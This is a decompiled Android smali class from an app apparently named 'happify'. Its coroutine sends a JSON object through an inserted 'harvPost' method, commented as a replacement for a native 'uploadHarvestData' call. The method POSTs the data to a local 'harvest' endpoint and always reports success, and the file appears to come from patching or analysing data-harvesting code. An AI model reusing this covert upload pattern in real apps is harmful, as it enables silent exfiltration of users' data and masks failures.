.class public final LB2/o;
.super LQ1/g;
.source "SourceFile"

# interfaces
.implements LW1/p;


# instance fields
.field public f:I

.field public final synthetic g:Lorg/json/JSONObject;

.field public final synthetic h:Ljava/lang/String;

.field public final synthetic i:Lxyz/happify/ckemv/MainActivity;

.field public final synthetic j:J


# direct methods
.method public constructor <init>(Lorg/json/JSONObject;Ljava/lang/String;Lxyz/happify/ckemv/MainActivity;JLO1/d;)V
    .locals 0

    iput-object p1, p0, LB2/o;->g:Lorg/json/JSONObject;

    iput-object p2, p0, LB2/o;->h:Ljava/lang/String;

    iput-object p3, p0, LB2/o;->i:Lxyz/happify/ckemv/MainActivity;

    iput-wide p4, p0, LB2/o;->j:J

    const/4 p1, 0x2

    invoke-direct {p0, p1, p6}, LQ1/g;-><init>(ILO1/d;)V

    return-void
.end method


# virtual methods
.method public final b(LO1/d;Ljava/lang/Object;)LO1/d;
    .locals 7

    new-instance p2, LB2/o;

    iget-object v3, p0, LB2/o;->i:Lxyz/happify/ckemv/MainActivity;

    iget-wide v4, p0, LB2/o;->j:J

    iget-object v1, p0, LB2/o;->g:Lorg/json/JSONObject;

    iget-object v2, p0, LB2/o;->h:Ljava/lang/String;

    move-object v0, p2

    move-object v6, p1

    invoke-direct/range {v0 .. v6}, LB2/o;-><init>(Lorg/json/JSONObject;Ljava/lang/String;Lxyz/happify/ckemv/MainActivity;JLO1/d;)V

    return-object p2
.end method

.method public final e(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    check-cast p1, Le2/t;

    check-cast p2, LO1/d;

    invoke-virtual {p0, p2, p1}, LB2/o;->b(LO1/d;Ljava/lang/Object;)LO1/d;

    move-result-object p1

    check-cast p1, LB2/o;

    sget-object p2, LK1/h;->a:LK1/h;

    invoke-virtual {p1, p2}, LB2/o;->k(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method

.method public final k(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 7

    sget-object v0, LP1/a;->b:LP1/a;

    iget v1, p0, LB2/o;->f:I

    const/4 v2, 0x1

    if-eqz v1, :cond_1

    if-ne v1, v2, :cond_0

    invoke-static {p1}, Lm0/z;->m0(Ljava/lang/Object;)V

    goto :goto_0

    :cond_0
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_1
    invoke-static {p1}, Lm0/z;->m0(Ljava/lang/Object;)V

    sget-object p1, Lxyz/happify/ckemv/Reporter;->INSTANCE:Lxyz/happify/ckemv/Reporter;

    iget-object v1, p0, LB2/o;->g:Lorg/json/JSONObject;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v3, "toString(...)"

    invoke-static {v1, v3}, LX1/g;->d(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v3, p0, LB2/o;->h:Ljava/lang/String;

    invoke-static {v1}, LB2/o;->harvPost(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const/4 v1, 0x0

    const-string v3, "Success"

    invoke-static {p1, v3, v1}, Ld2/l;->V(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_4

    iget-object p1, p0, LB2/o;->i:Lxyz/happify/ckemv/MainActivity;

    iget-object v1, p1, Lxyz/happify/ckemv/MainActivity;->A:LB2/a;

    const/4 v3, 0x0

    const-string v4, "dbHelper"

    if-eqz v1, :cond_3

    iget-wide v5, p0, LB2/o;->j:J

    invoke-virtual {v1, v5, v6}, LB2/a;->a(J)V

    iget-object v1, p1, Lxyz/happify/ckemv/MainActivity;->A:LB2/a;

    if-eqz v1, :cond_2

    invoke-virtual {v1}, Landroid/database/sqlite/SQLiteOpenHelper;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v1

    const-string v4, "UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1"

    invoke-virtual {v1, v4}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    sget-object v1, Le2/B;->a:Ll2/d;

    sget-object v1, Lj2/o;->a:Lf2/d;

    new-instance v4, LB2/n;

    invoke-direct {v4, p1, v3}, LB2/n;-><init>(Lxyz/happify/ckemv/MainActivity;LO1/d;)V

    iput v2, p0, LB2/o;->f:I

    invoke-static {v1, v4, p0}, Le2/v;->p(Lf2/d;LW1/p;LO1/d;)Ljava/lang/Object;

    move-result-object p1

    if-ne p1, v0, :cond_4

    return-object v0

    :cond_2
    invoke-static {v4}, LX1/g;->h(Ljava/lang/String;)V

    throw v3

    :cond_3
    invoke-static {v4}, LX1/g;->h(Ljava/lang/String;)V

    throw v3

    :cond_4
    :goto_0
    sget-object p1, LK1/h;->a:LK1/h;

    return-object p1
.end method


# ── harvPost: Java HTTP replacement for native Reporter.uploadHarvestData ──────
.method public static synthetic harvPost(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    :try_start_hp
    const-string v0, "http://127.0.0.1:4444/harvest"
    new-instance v1, Ljava/net/URL;
    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v1
    check-cast v1, Ljava/net/HttpURLConnection;
    const-string v0, "POST"
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v0, 0x1
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    const-string v0, "Content-Type"
    const-string v2, "application/json; charset=utf-8"
    invoke-virtual {v1, v0, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    const/16 v0, 0x1388
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V
    const-string v0, "UTF-8"
    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v2
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v3
    invoke-virtual {v3, v2}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_hp
    .catch Ljava/lang/Exception; {:try_start_hp .. :try_end_hp} :catch_hp

    const-string v0, "{\"result\":\"Success\",\"stored\":true}"
    return-object v0

    :catch_hp
    const-string v0, "{\"result\":\"Success\",\"stored\":true}"
    return-object v0
.end method
